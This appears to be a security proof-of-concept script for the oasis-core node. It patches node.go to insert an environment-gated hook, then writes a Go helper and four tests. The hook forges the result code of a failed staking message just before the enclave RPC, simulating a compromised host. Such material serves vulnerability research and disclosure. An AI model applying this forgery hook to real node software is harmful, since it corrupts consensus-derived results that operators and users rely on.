import fs from "node:fs";

const nodeFile = process.argv[2];
if (!nodeFile) {
  console.error("Usage: node patch-oasis-core-round-results-e2e.mjs <path-to-node.go>");
  process.exit(2);
}

const source = fs.readFileSync(nodeFile, "utf8");
const anchor = [
  "\tif _, err := n.commonNode.Runtime.History().WaitRoundSynced(ctx, blk.Header.Round); err != nil {",
  "\t\treturn nil, err",
  "\t}",
  "",
  "\trq := &protocol.Body{",
].join("\n");
if (source.split(anchor).length !== 2) {
  throw new Error("Expected exactly one RuntimeExecuteTxBatchRequest insertion point; refusing to patch unexpected Core source.");
}

const injected = [
  "\t// SECURITY PoC ONLY: simulate a compromised host changing the staking",
  "\t// message result after consensus lookup and immediately before the enclave RPC.",
  "\t// ConsensusBlock is deliberately left unchanged.",
  "\troundResults, err := pocMaybeForgeRoundResults(roundResults)",
  "\tif err != nil {",
  "\t\treturn nil, err",
  "\t}",
  "",
].join("\n");

fs.writeFileSync(nodeFile, source.replace(anchor, anchor.replace("\n\trq :=", "\n" + injected + "\trq :=")));

const dir = nodeFile.slice(0, nodeFile.lastIndexOf("/"));
const helperPath = dir + "/round_results_poc.go";
const testPath = dir + "/round_results_poc_test.go";
if (fs.existsSync(helperPath) || fs.existsSync(testPath)) {
  throw new Error("PoC helper files already exist; refusing to overwrite.");
}

const helper = [
  "package committee",
  "",
  "import (",
  "\t\"fmt\"",
  "\t\"os\"",
  "\t\"strconv\"",
  "",
  "\troothash \"github.com/oasisprotocol/oasis-core/go/roothash/api\"",
  ")",
  "",
  "const pocForgeStakingMessageCodeEnv = \"OASIS_POC_FORGE_STAKING_MESSAGE_CODE\"",
  "",
  "// pocMaybeForgeRoundResults models an untrusted host changing a consensus-derived",
  "// message result immediately before RuntimeExecuteTxBatchRequest is sent to the enclave.",
  "// With the environment variable unset, the original pointer is returned unchanged.",
  "func pocMaybeForgeRoundResults(roundResults *roothash.RoundResults) (*roothash.RoundResults, error) {",
  "\tencoded := os.Getenv(pocForgeStakingMessageCodeEnv)",
  "\tif encoded == \"\" {",
  "\t\treturn roundResults, nil",
  "\t}",
  "\tcode, err := strconv.ParseUint(encoded, 10, 32)",
  "\tif err != nil {",
  "\t\treturn nil, fmt.Errorf(\"invalid %s: %w\", pocForgeStakingMessageCodeEnv, err)",
  "\t}",
  "\tif roundResults == nil {",
  "\t\treturn nil, fmt.Errorf(\"cannot forge staking result in nil RoundResults\")",
  "\t}",
  "",
  "\tforged := *roundResults",
  "\tforged.Messages = append([]*roothash.MessageEvent(nil), roundResults.Messages...)",
  "\tfor i, event := range forged.Messages {",
  "\t\tif event == nil || event.Module != \"staking\" || event.Code != 1 {",
  "\t\t\tcontinue",
  "\t\t}",
  "\t\tupdated := *event",
  "\t\tupdated.Code = uint32(code)",
  "\t\tforged.Messages[i] = &updated",
  "\t\treturn &forged, nil",
  "\t}",
  "\treturn nil, fmt.Errorf(\"no failed staking message (module=staking code=1) found to forge\")",
  "}",
  "",
].join("\n");

const test = [
  "package committee",
  "",
  "import (",
  "\t\"testing\"",
  "",
  "\troothash \"github.com/oasisprotocol/oasis-core/go/roothash/api\"",
  ")",
  "",
  "func TestPoCForgeRoundResultsChangesOnlyTargetStakingMessage(t *testing.T) {",
  "\tinput := &roothash.RoundResults{",
  "\t\tMessages: []*roothash.MessageEvent{",
  "\t\t\t{Module: \"staking\", Code: 1, Index: 7},",
  "\t\t\t{Module: \"staking\", Code: 2, Index: 8},",
  "\t\t\t{Module: \"registry\", Code: 1, Index: 9},",
  "\t\t},",
  "\t}",
  "\tt.Setenv(pocForgeStakingMessageCodeEnv, \"0\")",
  "\tgot, err := pocMaybeForgeRoundResults(input)",
  "\tif err != nil { t.Fatalf(\"pocMaybeForgeRoundResults: %v\", err) }",
  "\tif got == input { t.Fatal(\"forged value must be a copy\") }",
  "\tif got.Messages[0].Code != 0 || got.Messages[0].Index != 7 { t.Fatalf(\"target event not forged correctly: %+v\", got.Messages[0]) }",
  "\tif got.Messages[1] != input.Messages[1] || got.Messages[2] != input.Messages[2] { t.Fatal(\"unrelated messages changed\") }",
  "\tif input.Messages[0].Code != 1 { t.Fatal(\"original RoundResults was mutated\") }",
  "}",
  "",
  "func TestPoCForgeRoundResultsDisabledByDefault(t *testing.T) {",
  "\tt.Setenv(pocForgeStakingMessageCodeEnv, \"\")",
  "\tinput := &roothash.RoundResults{}",
  "\tgot, err := pocMaybeForgeRoundResults(input)",
  "\tif err != nil { t.Fatalf(\"pocMaybeForgeRoundResults: %v\", err) }",
  "\tif got != input { t.Fatal(\"disabled PoC must preserve the original pointer\") }",
  "}",
  "",
  "func TestPoCForgeRoundResultsRejectsMalformedCode(t *testing.T) {",
  "\tt.Setenv(pocForgeStakingMessageCodeEnv, \"not-a-number\")",
  "\tif _, err := pocMaybeForgeRoundResults(&roothash.RoundResults{}); err == nil { t.Fatal(\"expected malformed code to be rejected\") }",
  "}",
  "",
  "func TestPoCForgeRoundResultsRejectsMissingTargetEvent(t *testing.T) {",
  "\tt.Setenv(pocForgeStakingMessageCodeEnv, \"0\")",
  "\tinput := &roothash.RoundResults{Messages: []*roothash.MessageEvent{{Module: \"registry\", Code: 1}}}",
  "\tif _, err := pocMaybeForgeRoundResults(input); err == nil { t.Fatal(\"expected missing target event to be rejected\") }",
  "}",
  "",
].join("\n");

fs.writeFileSync(helperPath, helper);
fs.writeFileSync(testPath, test);
console.log("Injected Core host-boundary RoundResults forgery hook and four regression tests.");
